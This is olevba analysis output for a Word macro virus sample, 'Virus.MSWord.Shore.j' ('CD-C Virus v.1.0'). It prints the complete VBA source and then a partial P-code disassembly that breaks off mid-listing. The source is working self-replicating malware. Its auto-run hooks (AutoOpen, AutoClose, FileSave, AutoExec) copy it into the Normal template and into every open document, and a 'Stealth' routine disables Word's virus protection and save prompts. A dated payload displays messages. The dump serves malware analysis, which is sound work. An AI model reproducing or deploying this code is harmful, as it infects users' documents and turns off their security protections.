olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CDC_v10.bas 
in file: Virus.MSWord.Shore.j - OLE stream: 'Macros/VBA/CDC_v10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***** CD-C Virus v.1.0 *****
'Tembalang, Saturday, November 18, 2000

Public Const SeriesNumber = 200002
Public Const ModuleName = "CDC_v10", FormName = "CDC_Form", _
        mw = "Microsoft Word", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        Destroying = "Normal." & ModuleName & ".Destroyer", _
        Checking = "Normal." & ModuleName & ".CheckNormal"

Public Const CDE = "CD-C Electrical Engineering", _
        hcID = "Ahmad", mail = "e-mail: mas.cdc@usa.net", _
        ACDE = "About CD-C"
        
Public Const HAText1 = "Dengerin nasehat symbah AM. " & _
             "Bermain air basah, bermain api gosong, " & _
             "Bermain virus asyiiik dech...", _
        cipta = "CD-C EE v.10 (C) " & hcID, _
        ttgl = "Tembalang, Nov, 2000"
                 
Public Const msg = "Guoooblok!!! Kuncine keliru :))", _
        aaa = "fLQ-À°vtµÆ__", bbb = "iq5diani", ccc = "ssss", _
        msgcap = "Pekok...!!!", _
        code = "gathel", ddd = "Kluruk", eee = "Telp117", _
        xxx = "cdee99"
Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'Procedures in CDC module
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub
Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value >= SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function
Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function
Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.CodeModule
                .DeleteLines 1, .CountOfLines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub
Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=FormName, _
            Object:=wdOrganizerObjectProjectItems
End Sub
Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub
Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub
'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub
Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
   
Sub AutoExec()
    WordBasic.DisableAutoMacros True
    InitDialog
    Application.OnTime Now + TimeSerial(0, 0, 9), Destroying
End Sub

Sub Destroyer()
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    CheckNormal
End Sub

Sub CheckNormal()
    If Not getInfected(NormalTemplate) Then _
        Copy2Normal
    Application.OnTime Now + TimeSerial(0, 1, 0), Checking
End Sub
Sub AutoExit()
    AutoOpen
    ModifyAttr NormalTemplate.FullName
    PesanClose
End Sub

Sub fileNewDefault()
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    Application.ShowVisualBasicEditor = False

End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    Stealth
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbExclamation, msgcap)
    '**** AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cdee = "CD-C " + EE
    sandi = xxx + Mid(code, 5, 2)
    If LCase(InputBox(pass, cdee)) = sandi Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    'InitDialog
    'ToolsMacrosDlg.Display
    '**** AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    '**** AnimateCaption
End Sub

Sub ViewVbCode()
    'Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    'viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    '**** AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub


Sub Ngeceng()
    For i = 0 To 100
        Beep
    Next i
    With CDC_Form
        .Width = 220
        .Height = 170
        With .Judul
            .Left = 15
            .Top = 5
            .Width = 180
            .Height = 20
            .Caption = CDE
            .Font.Bold = True
        End With
        With .OKButton
            .Width = 50
            .Height = 25
            .Left = 85
            .Top = 120
        End With
        With .Komentar
            .Width = 200
            .Height = 90
            .Top = 30
            .Left = 5
        End With
        .Show
    End With

End Sub

Sub HelpAbout()
    With CDC_Form
        .Caption = "About CD-C"
        .Komentar.Text = HAText1 & Chr(13) & Chr(13) & _
                cipta & Chr(13) & ttgl & Chr(13) & _
                mail
    End With
    Ngeceng
End Sub


Sub PesanClose()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSaturday) And _
        Date > #12/15/00# And _
        (Time > #5:00:00 PM# And Time < #9:00:00 PM#) Then
        For i = 1 To 100
            Beep
        Next i
        CDC_Form.Caption = "Selamat Tinggal"
        With CDC_Form.Komentar
        .Text = "CD-C Antivirus v.10" & Chr(13) & _
                "Terimakasih atas pengguanan software ini" & Chr(13) & _
                "dan semoga komputer anda terhindar dari" & Chr(13) & _
                "virus komputer yang merusak. Amiin." & Chr(13) & _
                Chr(13) & cipta & ", Nov 2000" & Chr(13) & _
                mail
        End With
        Ngeceng
     End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/CDC_v10 - 19241 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001C "***** CD-C Virus v.1.0 *****"
' Line #1:
' 	QuoteRem 0x0000 0x0026 "Tembalang, Saturday, November 18, 2000"
' Line #2:
' Line #3:
' 	Dim (Public Const) 
' 	LitDI4 0x0D42 0x0003 
' 	VarDefn SeriesNumber
' Line #4:
' 	LineCont 0x0014 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1E 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0007 "CDC_v10"
' 	VarDefn ModuleName
' 	LitStr 0x0008 "CDC_Form"
' 	VarDefn FormName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000A ".Destroyer"
' 	Concat 
' 	VarDefn Destroying
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000C ".CheckNormal"
' 	Concat 
' 	VarDefn Checking
' Line #5:
' Line #6:
' 	LineCont 0x0008 06 00 08 00 0E 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x001B "CD-C Electrical Engineering"
' 	VarDefn CDE
' 	LitStr 0x0005 "Ahmad"
' 	VarDefn hcID
' 	LitStr 0x0017 "e-mail: mas.cdc@usa.net"
' 	VarDefn mail
' 	LitStr 0x000A "About CD-C"
' 	VarDefn ACDE
' Line #7:
' Line #8:
' 	LineCont 0x0010 06 00 0D 00 08 00 0D 00 0A 00 08 00 10 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x001C "Dengerin nasehat symbah AM. "
' 	LitStr 0x0027 "Bermain air basah, bermain api gosong, "
' 	Concat 
' 	LitStr 0x001D "Bermain virus asyiiik dech..."
' 	Concat 
' 	VarDefn HAText1
' 	LitStr 0x0011 "CD-C EE v.10 (C) "
' 	Ld hcID 
' 	Concat 
' 	VarDefn cipta
' 	LitStr 0x0014 "Tembalang, Nov, 2000"
' 	VarDefn ttgl
' Line #9:
' Line #10:
' 	LineCont 0x0010 06 00 08 00 12 00 08 00 16 00 08 00 22 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x001F "Guoooblok!!! Kuncine keliru :))"
' 	VarDefn msg
' 	LitStr 0x000C "fLQ-À°vtµÆ__"
' 	VarDefn aaa
' 	LitStr 0x0008 "iq5diani"
' 	VarDefn bbb
' 	LitStr 0x0004 "ssss"
' 	VarDefn ccc
' 	LitStr 0x000B "Pekok...!!!"
' 	VarDefn msgcap
' 	LitStr 0x0006 "gathel"
' 	VarDefn code
' 	LitStr 0x0006 "Kluruk"
' 	VarDefn ddd
' 	LitStr 0x0007 "Telp117"
' 	VarDefn eee
' 	LitStr 0x0006 "cdee99"
' 	VarDefn xxx
' Line #11:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0018 "Procedures in CDC module"
' Line #14:
' 	FuncDefn (Sub Buggy())
' Line #15:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #16:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #17:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #18:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' Line #20:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #23:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #24:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #25:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #26:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #27:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #29:
' 	ExitFunc 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndWith 
' Line #32:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndFunc 
' Line #34:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #35:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #36:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #37:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #38:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #40:
' 	ExitFunc 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndFunc 
' Line #44:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #45:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #46:
' 	EndFunc 
' Line #47:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #48:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #49:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #50:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #51:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #52:
' 	ElseBlock 
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd CodeModule 
' 	With 
' Line #55:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #56:
' 	EndWith 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' Line #60:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #61:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #62:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #65:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #66:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #67:
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld FormName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #75:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #76:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #77:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub Copy2Normal())
' Line #83:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #84:
' 	ArgsCall Stealth 0x0000 
' Line #85:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #86:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #87:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #88:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #89:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #90:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #94:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #95:
' 	EndWith 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Sub Copy2Document())
' Line #99:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #100:
' 	ArgsCall Stealth 0x0000 
' Line #101:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #102:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #105:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #107:
' 	EndSub 
' Line #108:
' Line #109:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #110:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #111:
' 	EndSub 
' Line #112:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #113:
' 	FuncDefn (Sub AutoOpen())
' Line #114:
' 	ArgsCall Stealth 0x0000 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #116:
' Line #117:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #118:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #119:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	ArgsCall Copy2Normal 0x0000 
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndSub 
' Line #129:
' Line #130:
' 	FuncDefn (Sub FileOpen())
' Line #131:
' 	ArgsCall Stealth 0x0000 
' Line #132:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #133:
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #136:
' 	ArgsCall AutoOpen 0x0000 
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #139:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #142:
' 	EndSub 
' Line #143:
' Line #144:
' 	FuncDefn (Sub AutoClose())
' Line #145:
' 	ArgsCall Stealth 0x0000 
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #148:
' 	ArgsCall Copy2Document 0x0000 
' Line #149:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #150:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #151:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #152:
' 	EndSub 
' Line #153:
' Line #154:
' 	FuncDefn (Sub FileClose())
' Line #155:
' 	Dim 
' 	VarDefn afn (As String)
' Line #156:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	ArgsCall AutoClose 0x0000 
' Line #159:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #160:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #161:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #162:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #163:
' 	EndSub 
' Line #164:
' Line #165:
' 	FuncDefn (Sub FileSave())
' Line #166:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #167:
' Line #168:
' 	ArgsCall Copy2Document 0x0000 
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #171:
' 	ArgsMemCallWith Save 0x0000 
' Line #172:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #173:
' 	EndWith 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub InitDialog())
' Line #177:
' 	ArgsCall Stealth 0x0000 
' Line #178:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
